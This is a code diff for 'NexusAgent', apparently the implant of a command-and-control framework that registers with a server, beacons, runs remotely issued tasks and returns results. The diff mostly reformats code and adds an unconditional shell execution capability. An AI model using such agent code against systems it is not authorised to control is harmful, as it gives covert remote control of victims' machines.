@@ -1,8 +1,8 @@
-use nexus_common::*;
 use crate::communication::NetworkClient;
 use crate::execution::TaskExecutor;
 use crate::registry::TechniqueRegistry;
 use crate::system::SystemInfo;
+use nexus_common::*;
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::{sleep, timeout};
@@ -28,8 +28,11 @@ impl NexusAgent {
         let technique_registry = TechniqueRegistry::build();
         let system_info = SystemInfo::collect().await?;
 
-        // Determine agent capabilities based on OS and compilation features
+        // Determine agent capabilities based on OS and compilation features.
+        // shell_execution is provided unconditionally — v1.2 ships the
+        // portable-pty shell session under nexus_agent::shell.
         let mut capabilities = vec![
+            "shell_execution".to_string(),
             "file_operations".to_string(),
             "network_operations".to_string(),
         ];
@@ -108,8 +111,10 @@ impl NexusAgent {
         // Send registration with timeout
         let response = timeout(
             Duration::from_secs(30),
-            self.network_client.send_message(&encrypted_message)
-        ).await??;
+            self.network_client.send_message(&encrypted_message),
+        )
+        .await
+        .map_err(|e| NexusError::NetworkError(format!("timeout: {}", e)))??;
 
         let decrypted_response = self.crypto.decrypt(&response)?;
         let response_message: Message = serde_json::from_str(&decrypted_response)?;
@@ -118,16 +123,21 @@ impl NexusAgent {
             self.id = Some(response_message.content);
             self.registered = true;
             self.last_heartbeat = current_timestamp();
-            
+
             #[cfg(debug_assertions)]
-            println!("Successfully registered with agent ID: {}", self.id.as_ref().unwrap());
+            println!(
+                "Successfully registered with agent ID: {}",
+                self.id.as_ref().unwrap()
+            );
         }
 
         Ok(())
     }
 
     async fn heartbeat(&mut self) -> Result<Vec<TaskData>> {
-        let agent_id = self.id.as_ref()
+        let agent_id = self
+            .id
+            .as_ref()
             .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;
 
         let message = Message::heartbeat(agent_id.clone());
@@ -136,8 +146,10 @@ impl NexusAgent {
         // Send heartbeat with timeout
         let response = timeout(
             Duration::from_secs(15),
-            self.network_client.send_message(&encrypted_message)
-        ).await??;
+            self.network_client.send_message(&encrypted_message),
+        )
+        .await
+        .map_err(|e| NexusError::NetworkError(format!("timeout: {}", e)))??;
 
         let decrypted_response = self.crypto.decrypt(&response)?;
         let response_message: Message = serde_json::from_str(&decrypted_response)?;
@@ -181,7 +193,8 @@ impl NexusAgent {
             let params = TechniqueParams::from(&task_data);
             let technique_result = timeout(
                 Duration::from_secs(task_timeout),
-                self.technique_registry.dispatch(&ctx, &task_data.task_type, params),
+                self.technique_registry
+                    .dispatch(&ctx, &task_data.task_type, params),
             )
             .await;
             // Convert TechniqueResult -> Result<String> to match legacy path
@@ -204,12 +217,16 @@ impl NexusAgent {
         };
 
         let task_result = match result {
-            Ok(Ok(output)) => {
-                TaskResult::success(task_id.clone(), output, (current_timestamp() - start_time) * 1000)
-            }
-            Ok(Err(e)) => {
-                TaskResult::error(task_id.clone(), e.to_string(), (current_timestamp() - start_time) * 1000)
-            }
+            Ok(Ok(output)) => TaskResult::success(
+                task_id.clone(),
+                output,
+                (current_timestamp() - start_time) * 1000,
+            ),
+            Ok(Err(e)) => TaskResult::error(
+                task_id.clone(),
+                e.to_string(),
+                (current_timestamp() - start_time) * 1000,
+            ),
             Err(_) => {
                 TaskResult::timeout(task_id.clone(), (current_timestamp() - start_time) * 1000)
             }
@@ -222,20 +239,21 @@ impl NexusAgent {
     }
 
     async fn send_task_result(&mut self, task_result: TaskResult) -> Result<()> {
-        let agent_id = self.id.as_ref()
+        let agent_id = self
+            .id
+            .as_ref()
             .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;
 
-        let message = Message::task_result(
-            serde_json::to_string(&task_result)?,
-            agent_id.clone()
-        );
+        let message = Message::task_result(serde_json::to_string(&task_result)?, agent_id.clone());
         let encrypted_message = self.crypto.encrypt(&serde_json::to_string(&message)?)?;
 
         // Send with timeout
         let _response = timeout(
             Duration::from_secs(15),
-            self.network_client.send_message(&encrypted_message)
-        ).await??;
+            self.network_client.send_message(&encrypted_message),
+        )
+        .await
+        .map_err(|e| NexusError::NetworkError(format!("timeout: {}", e)))??;
 
         Ok(())
     }
@@ -271,7 +289,7 @@ mod tests {
     async fn test_agent_creation() {
         let server_addr = "127.0.0.1:4444".to_string();
         let key = [0u8; 32];
-        
+
         let agent = NexusAgent::new(server_addr, key).await.unwrap();
         assert!(!agent.is_registered());
         assert!(agent.get_capabilities().len() > 0);
@@ -281,10 +299,10 @@ mod tests {
     async fn test_agent_capabilities() {
         let server_addr = "127.0.0.1:4444".to_string();
         let key = [0u8; 32];
-        
+
         let agent = NexusAgent::new(server_addr, key).await.unwrap();
         let capabilities = agent.get_capabilities();
-        
+
         assert!(capabilities.contains(&"shell_execution".to_string()));
         assert!(capabilities.contains(&"file_operations".to_string()));
         assert!(capabilities.contains(&"network_operations".to_string()));
